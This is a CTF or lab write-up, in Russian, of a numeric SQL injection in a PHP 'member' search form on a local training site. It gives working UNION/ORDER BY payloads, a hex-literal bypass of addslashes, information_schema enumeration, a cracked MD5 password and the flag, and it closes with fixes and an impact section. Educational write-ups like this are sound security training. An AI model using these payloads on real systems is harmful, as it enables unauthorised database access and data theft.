# SQL Injection Basic — Writeup

## Уязвимая страница

`http://<IP>/index.php?page=member`

Форма "Search member by ID" (метод `GET`, параметр `id`) подставляет введённое
значение напрямую в SQL-запрос без экранирования и без проверки типа (ожидается
число, но никакой проверки на самом деле нет).

## Флаг

```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

---

## Ход эксплуатации — по шагам

### 1. Подтверждение уязвимости

Обычный запрос — возвращает одну запись:

```
id = 1
```

Инъекция — возвращает **все** записи вместо одной:

```
id = 0 or 1=1
```

**Через URL:**
```
http://127.0.0.1:8080/index.php?page=member&id=0+or+1=1&Submit=Submit
```

**Через поле ввода на форме (просто вставить текст и нажать Submit):**
```
0 or 1=1
```

Результат: вместо одной строки сайт вывел 4 записи (id 1, 2, 3, 5), включая
запись с `First name: Flag`, `Surname: GetThe` — подсказка про наличие флага.

---

### 2. Определение количества столбцов (ORDER BY)

**Через URL:**
```
http://127.0.0.1:8080/index.php?page=member&id=1+order+by+1&Submit=Submit
http://127.0.0.1:8080/index.php?page=member&id=1+order+by+2&Submit=Submit
http://127.0.0.1:8080/index.php?page=member&id=1+order+by+3&Submit=Submit
```

**Через поле ввода:**
```
1 order by 1
1 order by 2
1 order by 3
```

Результат:
- `order by 1` и `order by 2` — отработали нормально.
- `order by 3` — ошибка сервера:
  ```
  Unknown column '3' in 'order clause'
  ```

Вывод: запрос возвращает ровно **2 столбца**.

---

### 3. Определение таблиц в базе данных (information_schema)

**Через URL:**
```
http://127.0.0.1:8080/index.php?page=member&id=0+union+select+table_name,2+from+information_schema.tables+where+table_schema=database()&Submit=Submit
```

**Через поле ввода:**
```
0 union select table_name,2 from information_schema.tables where table_schema=database()
```

Результат: единственная таблица в базе — `users`.

---

### 4. Определение столбцов таблицы `users`

Прямая попытка с кавычками (`table_name='users'`) была заблокирована
экранированием (`addslashes()`), поэтому строка `'users'` передана в HEX-виде
(`0x7573657273`), чтобы в запросе вообще не было символа кавычки:

**Через URL:**
```
http://127.0.0.1:8080/index.php?page=member&id=0+union+select+column_name,2+from+information_schema.columns+where+table_name=0x7573657273&Submit=Submit
```

**Через поле ввода:**
```
0 union select column_name,2 from information_schema.columns where table_name=0x7573657273
```

Результат — список столбцов таблицы `users`:
```
user_id, first_name, last_name, town, country, planet, Commentaire, countersign
```
(сайт в обычном режиме показывает только `first_name` и `last_name` — остальные
6 столбцов скрыты от пользователя, но доступны через инъекцию).

---

### 5. Извлечение скрытых данных (Commentaire, countersign)

Строка `'Flag'` также передана в HEX (`0x466c6167`), чтобы обойти
экранирование кавычек.

**Через URL:**
```
http://127.0.0.1:8080/index.php?page=member&id=0+union+select+Commentaire,countersign+from+users+where+first_name=0x466c6167&Submit=Submit
```

**Через поле ввода:**
```
0 union select Commentaire,countersign from users where first_name=0x466c6167
```

Результат:
```
Commentaire : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
countersign : 5ff9d0165b4f92b14994e5c685cdce28
```

---

### 6. Расшифровка countersign → получение флага

`countersign` — это MD5-хэш. Инструкция в `Commentaire`: расшифровать пароль,
привести к нижнему регистру, взять от него SHA256.

```
5ff9d0165b4f92b14994e5c685cdce28  -->  MD5("FortyTwo")
"FortyTwo" -> lower -> "fortytwo"
SHA256("fortytwo") = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

Это и есть искомый флаг.

---

## Механизм уязвимости (кратко для защиты)

Параметр `id` подставлялся в SQL-запрос напрямую, без prepared statements и
без проверки, что это действительно число:

```sql
SELECT first_name, last_name FROM users WHERE id = <ввод пользователя>
```

Так как поле числовое, вокруг него нет кавычек в запросе — значит, фильтрация
одинарных кавычек (которая присутствует в других формах сайта, например
в логине) здесь не защищает вообще ничего: инъекция строится без единой
кавычки (`or 1=1`, `union select ...`, HEX-литералы вместо строк в кавычках).

## Как исправить (fix)

- Использовать **prepared statements** (параметризованные запросы) — тогда
  пользовательский ввод передаётся в базу как данные, а не как часть кода
  запроса.
- Дополнительно — валидировать вход через `is_numeric($id)` / `(int)$id`
  перед использованием в запросе (не заменяет prepared statements, но
  дополнительный уровень защиты).
- Ограничить права аккаунта БД, под которым работает сайт: запретить чтение
  `information_schema` и системных таблиц, если это не требуется приложению.

## Impact (ущерб в реальности)

Через эту уязвимость атакующий может прочитать (а на некоторых конфигурациях
— и изменить/удалить) произвольные данные из базы: пароли, персональные
данные всех пользователей, структуру всей базы данных — без какой-либо
авторизации.
